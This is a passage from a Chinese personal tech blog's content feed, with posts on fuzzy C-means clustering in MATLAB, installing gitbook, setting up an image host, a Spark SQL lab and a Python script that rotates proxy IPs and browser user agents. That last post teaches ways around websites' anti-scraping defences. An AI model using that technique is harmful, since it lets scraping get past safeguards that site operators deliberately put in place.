class="hljs-built_in">rand</span>(cluster_n, data_n);col_sum = sum(U);U = U./col_sum(<span class="hljs-built_in">ones</span>(cluster_n, <span class="hljs-number">1</span>), :);<span class="hljs-comment">%归一化</span><span class="hljs-keyword">end</span>  <span class="hljs-comment">%% 子函数</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[U_new, center, obj_fcn]</span> = <span class="hljs-title">stepfcm</span><span class="hljs-params">(data, U, cluster_n, expo)</span></span><span class="hljs-comment">% 模糊C均值聚类时迭代的一步</span><span class="hljs-comment">% 输入：</span><span class="hljs-comment">%   data        ---- nxm矩阵,表示n个样本,每个样本具有m的维特征值</span><span class="hljs-comment">%   U           ---- 隶属度矩阵</span><span class="hljs-comment">%   cluster_n   ---- 标量,表示聚合中心数目,即类别数</span><span class="hljs-comment">%   expo        ---- 隶属度矩阵U的指数                     </span><span class="hljs-comment">% 输出：</span><span class="hljs-comment">%   U_new       ---- 迭代计算出的新的隶属度矩阵</span><span class="hljs-comment">%   center      ---- 迭代计算出的新的聚类中心</span><span class="hljs-comment">%   obj_fcn     ---- 目标函数值</span>mf = U.^expo;       <span class="hljs-comment">% 隶属度矩阵进行指数运算结果</span>center = mf*data./((<span class="hljs-built_in">ones</span>(<span class="hljs-built_in">size</span>(data, <span class="hljs-number">2</span>), <span class="hljs-number">1</span>)*sum(mf'))'); <span class="hljs-comment">% 新聚类中心(5.4)式</span>dist = distfcm(center, data);       <span class="hljs-comment">% 计算距离矩阵</span>obj_fcn = sum(sum((dist.^<span class="hljs-number">2</span>).*mf));  <span class="hljs-comment">% 计算目标函数值 (5.1)式</span>tmp = dist.^(<span class="hljs-number">-2</span>/(expo<span class="hljs-number">-1</span>));    U_new = tmp./(<span class="hljs-built_in">ones</span>(cluster_n, <span class="hljs-number">1</span>)*sum(tmp));  <span class="hljs-comment">% 计算新的隶属度矩阵 (5.3)式</span> <span class="hljs-keyword">end</span>  <span class="hljs-comment">%% 子函数</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">out</span> = <span class="hljs-title">distfcm</span><span class="hljs-params">(center, data)</span></span><span class="hljs-comment">% 计算样本点距离聚类中心的距离</span><span class="hljs-comment">% 输入：</span><span class="hljs-comment">%   center     ---- 聚类中心</span><span class="hljs-comment">%   data       ---- 样本点</span><span class="hljs-comment">% 输出：</span><span class="hljs-comment">%   out        ---- 距离</span>out = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(center, <span class="hljs-number">1</span>), <span class="hljs-built_in">size</span>(data, <span class="hljs-number">1</span>));  <span class="hljs-keyword">for</span> k = <span class="hljs-number">1</span>:<span class="hljs-built_in">size</span>(center, <span class="hljs-number">1</span>) <span class="hljs-comment">% 对每一个聚类中心</span>    <span class="hljs-comment">% 每一次循环求得所有样本点到一个聚类中心的距离</span>    out(k, :) = <span class="hljs-built_in">sqrt</span>(sum(((data-<span class="hljs-built_in">ones</span>(<span class="hljs-built_in">size</span>(data,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)*center(k,:)).^<span class="hljs-number">2</span>)',<span class="hljs-number">1</span>));  <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre></div><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a href="https://blog.csdn.net/weixin_42029738/article/details/81978038" target="_blank" rel="noopener">K-means原理、优化及应用</a></p><p>[2] <a href="https://www.cnblogs.com/wxl845235800/p/11053261.html" target="_blank" rel="noopener">模糊C均值聚类的公式推导</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模糊聚类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitbook安装—_install卡住解决</title>
      <link href="/2020/07/21/gitbook%E5%AE%89%E8%A3%85%E2%80%94-install%E5%8D%A1%E4%BD%8F%E8%A7%A3%E5%86%B3/"/>
      <url>/2020/07/21/gitbook%E5%AE%89%E8%A3%85%E2%80%94-install%E5%8D%A1%E4%BD%8F%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<p>安装专用于发布电子书的gitbook（原来是网络问题）</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>可能有些人会好奇我明明已经搭建hexo博客了，为什么嗨哟啊用gitbook。</p><p>首先，hexo对latex的支持不说很好，这对我这种要常写数学公式的人来说很蓝瘦；</p><p>其次，hexo搭建的是博客，而如果想要放一本电子书，我觉得gitbook相比hexo更合适。</p><p>来看看gitbook的效果<a href="http://gitbook.hushuang.me/setup.html" target="_blank" rel="noopener">http://gitbook.hushuang.me/setup.html</a></p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h4 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h4><p>直接<a href="https://blog.csdn.net/sanxd/article/details/82624127" target="_blank" rel="noopener">下载安装</a>，记得<code>我的电脑-属性-高级系统设置-环境变量-系统/我的环境变量</code>里添加Git的安装路径（就是告诉自己的电脑Git在哪，这样就任何一个文件夹位置都能使用Git了）</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621220319488.png" srcset="/img/loading.gif" lazyload="" alt="image-20200621220319488"></p><p>例如Git安装在<code>D:\Git\git-2.22.0\</code>这个位置</p><p>则环境变量里添加：</p><p><code>D:\Git\git-2.22.0\usr\bin\</code></p><p><code>D:\Git\git-2.22.0\usr\bin\ssh-keygen.exe</code></p><h4 id="安装Nodejs"><a href="#安装Nodejs" class="headerlink" title="安装Nodejs"></a>安装Nodejs</h4><p>建议新手在<a href="http://nodejs.cn/download/" target="_blank" rel="noopener">官网下载</a>安装最新的稳定版本，同样也得在环境变量里添加，比如安装在<code>D:\nodejs</code>就添加<code>D:\nodejs</code></p><h2 id="安装gitbook"><a href="#安装gitbook" class="headerlink" title="安装gitbook"></a>安装gitbook</h2><h3 id="配置镜像"><a href="#配置镜像" class="headerlink" title="配置镜像"></a>配置镜像</h3><p>首先打开git bash安装淘宝镜像（因为用官方源安装太慢了）</p><div class="hljs code-wrapper"><pre><code class="hljs bash">npm i -g cnpm --registry=https://registry.npm.taobao.org</code></pre></div><p>检查一下用的是不是淘宝镜像</p><div class="hljs code-wrapper"><pre><code class="hljs routeros">npm<span class="hljs-built_in"> config </span><span class="hljs-builtin-name">get</span> registry</code></pre></div><p>安装之后使用命令时npm就该改<code>cnpm</code>了</p><h3 id="安装gitbook-cli"><a href="#安装gitbook-cli" class="headerlink" title="安装gitbook-cli"></a>安装gitbook-cli</h3><p>这里有个坑，要用管理员权限才能安装，linux开启<strong>管理员</strong>权限简单。</p><p>windows用户需要<kbd>鼠标右键</kbd>-<kbd>以管理员身份运行</kbd>打开命令提示符</p><p><img src="https://gitee.com/gdut_deepcode/ImageServer/raw/master/master/img/image-20200721061710237.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>然后cd 到需要放电子书的目录，比如书的文档放在D:\Book，windows用户输入：</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span>/d D:\Book</code></pre></div><p>然后</p><div class="hljs code-wrapper"><pre><code class="hljs avrasm">cnpm install gitbook-<span class="hljs-keyword">cli</span> -g</code></pre></div><p>等待安装完</p><h3 id="安装gitbook-1"><a href="#安装gitbook-1" class="headerlink" title="安装gitbook"></a>安装gitbook</h3><p>还是在放电子书的目录，输入</p><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">git init</span></code></pre></div><p>然后，会显示gitbook installing并一直在转圈圈，没错，跟卡住了一样，但实际上是在安装的。只要你能在任意一个文件目录使用<code>cnpm</code>就会安装（只要全局配置了淘宝镜像就会安装，虽然看起来真的跟卡住了一样）</p><p>这里会等待很久（可能是半个小时吧，看网络情况）</p><p>安装完了之后就看看怎么用吧</p><p><a href="http://gitbook.hushuang.me/setup.html" target="_blank" rel="noopener">http://gitbook.hushuang.me/setup.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python伪装ip以及浏览器型号</title>
      <link href="/2020/07/13/python%E4%BC%AA%E8%A3%85ip%E4%BB%A5%E5%8F%8A%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9E%8B%E5%8F%B7/"/>
      <url>/2020/07/13/python%E4%BC%AA%E8%A3%85ip%E4%BB%A5%E5%8F%8A%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9E%8B%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<p>python爬虫</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>爬虫通常需要伪装ip和浏览器，因为较大的数据网站都会做一些反爬虫防护，伪装ip和浏览器型号是<code>模拟登录</code>的基础。</p><h2 id="获取代理ip"><a href="#获取代理ip" class="headerlink" title="获取代理ip"></a>获取代理ip</h2><p>芝麻http等可以拿到一些免费的代码ip，但说实话我不喜欢这样的（量太少）,下面用一个脚本来判断ip是否能ping 通。</p><p>这里先随机生成ip地址放在<code>ip_original.txt</code>这个文件（每个ip地址独自一行），待判断的ip可以随机生成，也可以在某些网站获取，例如：<a href="http://www.shenjidaili.com/shareip/" target="_blank" rel="noopener">http://www.shenjidaili.com/shareip/</a></p><p>把这些复制到的处理一下，去除<code>端口号</code>，只留ip地址，例如125.108.106.10存入txt文本中。</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#judge_ip</span><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> xlwt<span class="hljs-comment">#读取txt文件里的ip地址存储为列表</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ReadTxtName</span><span class="hljs-params">(rootdir)</span>:</span>    lines = []    <span class="hljs-keyword">with</span> open(rootdir, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> file_to_read:        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:            line = file_to_read.readline()            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> line:                <span class="hljs-keyword">break</span>            line = line.strip(<span class="hljs-string">'\n'</span>)            lines.append(line)    <span class="hljs-keyword">return</span> lines<span class="hljs-comment">#保存列表</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">text_save</span><span class="hljs-params">(filename, data)</span>:</span><span class="hljs-comment">#filename为写入文件的路径，data为要写入数据列表.</span>    file = open(filename,<span class="hljs-string">'a'</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(data)):        s = str(data[i]).replace(<span class="hljs-string">'['</span>,<span class="hljs-string">''</span>).replace(<span class="hljs-string">']'</span>,<span class="hljs-string">''</span>)<span class="hljs-comment">#去除[],这两行按数据不同，可以选择</span>        s = s.replace(<span class="hljs-string">"'"</span>,<span class="hljs-string">''</span>).replace(<span class="hljs-string">','</span>,<span class="hljs-string">''</span>) +<span class="hljs-string">'\n'</span>   <span class="hljs-comment">#去除单引号，逗号，每行末尾追加换行符</span>        file.write(s)    file.close()    print(<span class="hljs-string">"保存文件成功"</span>)ip_list=ReadTxtName(<span class="hljs-string">'ip_original.txt'</span>)      <span class="hljs-comment">#读取待判断是否有效的ip列表</span>Effective_ip = [ ]  <span class="hljs-comment">#创建存储有效ip的列表</span><span class="hljs-comment">#判断ip是否可用</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>,len(ip_list)):    result=os.system(<span class="hljs-string">'ping '</span>+ ip_list[i])   <span class="hljs-comment">#0为可用ip，1为不可用ip</span>    <span class="hljs-comment">#print("结果是",result)</span>    <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:        Effective_ip.append( ip_list[i])    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">"第"</span>+str(i+<span class="hljs-number">1</span>)+<span class="hljs-string">"个ip无效"</span>)    text_save(<span class="hljs-string">'ip_list.txt'</span>, Effective_ip)<span class="hljs-comment">#保存有效ip</span></code></pre></div><h2 id="伪装后打开网页"><a href="#伪装后打开网页" class="headerlink" title="伪装后打开网页"></a>伪装后打开网页</h2><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.request<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> ssl<span class="hljs-keyword">import</span> random<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">openUrl</span><span class="hljs-params">(ip, agent)</span>:</span>    headers = {<span class="hljs-string">'User-Agent'</span>: agent}<span class="hljs-comment">#伪装浏览器型号</span>    proxies = {<span class="hljs-string">'http'</span> : ip}<span class="hljs-comment">#伪装ip地址</span>    requests.get(<span class="hljs-string">"https://www.baidu.com/"</span>, headers=headers, proxies=proxies, verify=<span class="hljs-literal">True</span>)    ssl._create_default_https_context = ssl._create_unverified_context    print(<span class="hljs-string">"Access to success."</span>)<span class="hljs-comment">#读取txt文件里的ip地址存储为列表</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ReadTxtName</span><span class="hljs-params">(rootdir)</span>:</span>    lines = []    <span class="hljs-keyword">with</span> open(rootdir, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> file_to_read:        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:            line = file_to_read.readline()            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> line:                <span class="hljs-keyword">break</span>            line = line.strip(<span class="hljs-string">'\n'</span>)            lines.append(line)    <span class="hljs-keyword">return</span> lines            <span class="hljs-comment">#随机选取ip</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randomIP</span><span class="hljs-params">(ip_list)</span>:</span>    ip = random.choice(ip_list)    <span class="hljs-keyword">return</span> ip<span class="hljs-comment">#随机选取浏览器型号</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randomUserAgent</span><span class="hljs-params">()</span>:</span>    UserAgent = random.choice([        <span class="hljs-string">'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'</span>,        <span class="hljs-string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36'</span>,        <span class="hljs-string">'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'</span>,        <span class="hljs-string">'Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)'</span>,        <span class="hljs-string">'Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0)'</span>,        <span class="hljs-string">'Mozilla/4.0(compatible;MSIE7.0;WindowsNT6.0)'</span>,        <span class="hljs-string">'Opera/9.80(WindowsNT6.1;U;en)Presto/2.8.131Version/11.11'</span>,        <span class="hljs-string">'Mozilla/5.0(WindowsNT6.1;rv:2.0.1)Gecko/20100101Firefox/4.0.1'</span>,        <span class="hljs-string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER'</span>,        <span class="hljs-string">'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)'</span>,        <span class="hljs-string">'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0'</span>,        <span class="hljs-string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36'</span>,        <span class="hljs-string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36'</span>    ])    <span class="hljs-keyword">return</span> UserAgent<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    ip_list = ReadTxtName(<span class="hljs-string">'ip_list.txt'</span>)       <span class="hljs-comment">#读入有效ip储存为列表</span>        ip = randomIP(ip_list)<span class="hljs-comment">#随机选择ip</span>        agent = randomUserAgent()<span class="hljs-comment">#随机选择浏览器型号</span>        openUrl(ip, agent)<span class="hljs-comment">#打开网页</span>        time.sleep(<span class="hljs-number">10</span>)</code></pre></div><p>戛然而止<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8">😝</span>（因为剩下的要干什么我就不提供了，仅供学习或研究使用）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图床</title>
      <link href="/2020/07/06/%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/"/>
      <url>/2020/07/06/%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<p>稳定、安全、免费地搭建自己的图床</p><a id="more"></a><h3 id="为什么要搭建图床？"><a href="#为什么要搭建图床？" class="headerlink" title="为什么要搭建图床？"></a>为什么要搭建图床？</h3><p>直接引用文件内的图片不好吗？少量图片的时候是是没问题，图片多了就麻烦了，而且像coding pages，带上一千多张图片是会部署失败的（其实就是文件数量太多了）。另外如果写博客在<code>博客园</code>、<code>掘金</code>等平台发布，总不能把图片也带上吧。这时候就需要搭建属于自己的图床了。</p><p>目前搭建图床的办法很多啦，像是七牛云、又拍云什么的（据说七牛云https流量收费，又拍云https流量免费但是好像有限制）。其实条件允许的话我是很推荐七牛云或腾讯云COS这些对象存储的，我就喜欢用代码托管平台的pages搭建图床，无它，就看上三点：<strong>免费</strong>、<strong>稳定</strong>、<strong>省得再去操心各个对象平台怎么用</strong></p><p>先来说一些老套的办法</p><h3 id="办法一：对象云存储"><a href="#办法一：对象云存储" class="headerlink" title="办法一：对象云存储"></a>办法一：对象云存储</h3><p>就是用七牛云、又拍云、腾讯云COS这些，要么氪金要么用着蓝瘦，二选一吧。</p><h3 id="办法二：GitHub-pages-jsDelivr-picgo"><a href="#办法二：GitHub-pages-jsDelivr-picgo" class="headerlink" title="办法二：GitHub pages + jsDelivr (+ picgo)"></a>办法二：GitHub pages + jsDelivr (+ picgo)</h3><p>github pages 直接设置里打开pages就行啦，至于 jsDelivr 也不是难用的东西，这个<strong>不用学</strong>。</p><p>jsDelivr是可以起到CDN加速，众所周知，国内访问github慢得一批，所以这里用一下cdn加速，可以让一些图片访问更快。</p><p>使用jsDelivr仅仅修改github pages 的链接即可</p><p>即 <a href="https://cdn.jsdelivr.net/gh/你的github用户名/你的仓库名@发布的版本号/文件路径" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/你的github用户名/你的仓库名@发布的版本号/文件路径</a> </p><p>例如：</p><p> <a href="https://cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@1.0/images/trhx.png" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@1.0/images/trhx.png</a></p><p>不用发布也可以，其格式为：（直接去掉@版本号）</p><p><a href="https://cdn.jsdelivr.net/gh/你的github用户名/仓库名/md/sadasdd516516156.png" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/你的github用户名/仓库名/md/sadasdd516516156.png</a></p><p> 这个虽然是部署在github上，但是经过cdn加速之后显然访问速度还是很快的，有兴趣的同鞋自己琢磨吧，反正我用过之后是不想用了，为啥？访问速度是没问题了，<strong>可我上传图片呢?</strong>（我的网速慢，上传张图片网络良好等个十几秒甚至几十秒，若网络不顺畅就上传失败，这谁顶得住啊！）</p><p>所以我推荐用国内coding或者gitee搭建图床。</p><h3 id="办法三：-coding-gitee-picgo"><a href="#办法三：-coding-gitee-picgo" class="headerlink" title="办法三： coding/gitee +picgo"></a>办法三： coding/gitee +picgo</h3><p>下载个PicGo,安装</p><p>在插件设置里搜索<code>coding</code>或者<code>gitee</code>（搜索gitee会出现两个插件，下载哪个都行），安装插件需要本机安装了nodejs</p><p>安装之后左侧列表就会出现coding图床和gitee图床啦</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200706230629.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>在用之前先取一下token（就是这个仓库用来识别使用非git的第三方应用有没有权限提交文件到该仓库的东西），在右上角的<kbd>个人设置</kbd>-<kbd>访问令牌</kbd>里新建</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200706232108.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>按需勾选，我就直接勾选前三个了，必须要保证token可以读写仓库，创建令牌之后会有一串字符，这个就是token，注意这个<strong>只显示一次</strong>（刷新或者退出页面就没了）保存一下这个token</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200706232249.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>然后在picgo填上信息，分支那里如果是要把图片放在master分支根目录，就直接写<code>master</code>。例如我要放在master分支的md文件夹，那么我就填<code>master/md</code></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200706232557.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p><strong>这里对于创建团队之后改过团队名的有个坑</strong>，团队名称要改成项目域名https后边的内容一样（即下面两个划红线的内容要一样）。因为picgo上传图片自动生成的链接是</p><p><code>https://团队现名.coding.net/p/项目名</code></p><p>但你的图片链接前面的部分是</p><p><code>https://团队初始名.coding.net/p/项目名</code></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/e95bed353a8ad8d01314ab242565634.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>设置好了直接把图片<code>拖动</code>或者<code>剪贴板图片上传</code>就好啦，如果有问题检测一下设置。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708201434930.png" srcset="/img/loading.gif" lazyload="" alt="image-20200708201434930"></p><p>上传成功之后直接<strong>粘贴</strong>就是图片链接了（windows点击打开picgo，是要在右侧点开<strong>显示隐藏图标</strong>,再<strong>鼠标右键</strong>-<strong>打开详细窗口</strong>才能打开上面的页面）</p><p>PicGo设置成这样也是有道理的，因为这样的话还是需要拖动文件到picgo，然后复制粘贴链接，但是用来markdown写作其实还有更简单的操作。</p><p>请先把Typora更新到0.98之后的版本</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708201926116.png" srcset="/img/loading.gif" lazyload="" alt="Typora帮助-检查更新"></p><p>然后在Typora的<kbd>偏好设置</kbd>-<kbd>图像</kbd>设置成上传图片，填上PicGO路径</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708202057900.png" srcset="/img/loading.gif" lazyload="" alt="设置自动上传md内图片到图床"></p><p>这样不用打开PicGo，直接把图片复制粘贴在Typora，就会自动将图片上传至图床并且改为外部链接，这样就可以直接发送md文件，不用担心在别的电脑/上传博客显示不出来啦。</p><p>（u1s1，Typora的bug也越来越多了，作为少见的几个<strong>所见即所得</strong>的markdown编辑器，Typora的强大与便捷让我觉得其他markdown编辑器真的代替不了。）</p><p>如果不需要在其他博客平台发布或者转换成html，Typora各方面都完美。如果是作为写博客的工具，可能会出现点小问题，如果出现排版混乱或者什么的推荐用vscode下载这两个插件。（之前我就遇到过用Typora写的在Typora看着完全没问题，但是hexo渲染之后却出问题了，我刚开始以为是hexo的某些插件的原因，直到发现复制粘贴在其他博客平台的markdown编辑器也会出现一样的问题，显然~是typora的锅）</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708202942467.png" srcset="/img/loading.gif" lazyload="" alt="image-20200708202942467"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200708202957889.png" srcset="/img/loading.gif" lazyload="" alt="image-20200708202957889"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spark SQL 上机实验</title>
      <link href="/2020/07/03/Spark-SQL-%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
      <url>/2020/07/03/Spark-SQL-%E4%B8%8A%E6%9C%BA%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>使用免费的Spark集群databrick,Spark SQL的基本编程方法以及RDD到DataFrame的转化方法</p><a id="more"></a><p>一、实验目的：</p><p>1、通过实验掌握Spark SQL的基本编程方法；</p><p>2、熟悉RDD到DataFrame的转化方法；</p><p>二、实验要求：</p><p>  按实验要求完成实验。</p><p>三、实验方案</p><p>1．Spark SQL基本操作</p><p>Win10更新后，linux系统的Hadoop环境已崩溃，故在此使用datadatabricks</p><p>将下列JSON格式数据复制到Linux系统中，并保存命名为employee.json。</p><p>{ “id”:1 , “name”:” Ella” , “age”:36 }</p><p>{ “id”:2, “name”:”Bob”,”age”:29 }</p><p>{ “id”:3 , “name”:”Jack”,”age”:29 }</p><p>{ “id”:4 , “name”:”Jim”,”age”:28 }</p><p>{ “id”:4 , “name”:”Jim”,”age”:28 }</p><p>{ “id”:5 , “name”:”Damon” }</p><p>{ “id”:5 , “name”:”Damon” }</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#读取json文件</span>\<span class="hljs-comment"># File location and type</span>file_location = <span class="hljs-string">"/FileStore/tables/employee.json"</span>file_type = <span class="hljs-string">"json"</span> \<span class="hljs-comment"># CSV options</span>infer_schema = <span class="hljs-string">"false"</span>first_row_is_header = <span class="hljs-string">"false"</span>delimiter = <span class="hljs-string">","</span> \<span class="hljs-comment"># The applied options are for CSV files. For other file types, these will be ignored.</span>df = spark.read.format(file_type) \ .option(<span class="hljs-string">"inferSchema"</span>, infer_schema) \ .option(<span class="hljs-string">"header"</span>, first_row_is_header) \ .option(<span class="hljs-string">"sep"</span>, delimiter) \ .load(file_location) display(df)                 <span class="hljs-comment">#打印出文件</span></code></pre></div><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image002-1593878295754.jpg" srcset="/img/loading.gif" lazyload="" alt="1593862725"></p><p># 创建employee临时表</p><div class="hljs code-wrapper"><pre><code class="hljs sql">df.registerTempTable("employee")</code></pre></div><ol><li>查询所有数据；</li></ol><div class="hljs code-wrapper"><pre><code class="hljs sql">sqlDF_01 = spark.sql("<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employee<span class="hljs-string">");</span><span class="hljs-string"></span><span class="hljs-string">sqlDF_01.show();</span></code></pre></div><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image004-1593878295755.jpg" srcset="/img/loading.gif" lazyload="" alt="1593862841">]</p><p> 2.查询所有的数据,并去重</p><div class="hljs code-wrapper"><pre><code class="hljs sql">sqlDF_02 = spark.sql("<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> * <span class="hljs-keyword">FROM</span> employee<span class="hljs-string">");</span><span class="hljs-string"></span><span class="hljs-string">sqlDF_02.show();</span></code></pre></div><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image005-1593878295756.png" srcset="/img/loading.gif" lazyload="" alt="ce49de6c106a6272e85fdcd160f88e0"></p><p>3.查询所有的数据,打印去除id字段（这里只查询了name age）</p><div class="hljs code-wrapper"><pre><code class="hljs sql">sqlDF_03 = spark.sql("<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">name</span>,age <span 